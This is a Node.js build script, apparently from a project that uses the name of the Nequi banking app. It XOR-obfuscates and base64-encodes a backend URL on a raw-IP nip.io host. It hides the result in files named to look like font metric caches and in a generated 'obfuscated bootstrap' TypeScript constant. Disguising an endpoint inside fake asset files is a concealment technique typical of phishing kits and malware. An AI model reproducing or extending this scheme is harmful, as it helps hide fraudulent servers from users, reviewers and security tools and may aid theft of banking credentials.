import { readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const root = fileURLToPath(new URL("..", import.meta.url));
const K = 0x5f;

function xorBytes(raw) {
	let out = "";
	for (let i = 0; i < raw.length; i++) {
		out += String.fromCharCode(raw.charCodeAt(i) ^ ((K + (i % 17)) & 0xff));
	}
	return out;
}

function encodePayload(payload) {
	const json = JSON.stringify(payload);
	const xored = xorBytes(json);
	return Buffer.from(xored, "binary").toString("base64");
}

const apiUrl =
	process.env.IOS_API_URL?.trim() ||
	"https://nequi-ios-node.18-118-168-237.nip.io";

const encoded = encodePayload({ u: apiUrl });
const manifest = JSON.stringify({ v: 2, m: encoded });

mkdirSync(join(root, "public", "assets", "fonts"), { recursive: true });

for (const rel of ["assets/fonts/metrics.cache", "assets/fm-cache.bin"]) {
	writeFileSync(join(root, "public", rel), manifest);
}

writeFileSync(
	join(root, "libs", "bootstrap-pack.ts"),
	`/** Generado por scripts/encode-bootstrap.mjs — no editar a mano */\nexport const BOOTSTRAP_PACK = ${JSON.stringify(encoded)};\n`,
);

console.log("✓ Bootstrap ofuscado generado");
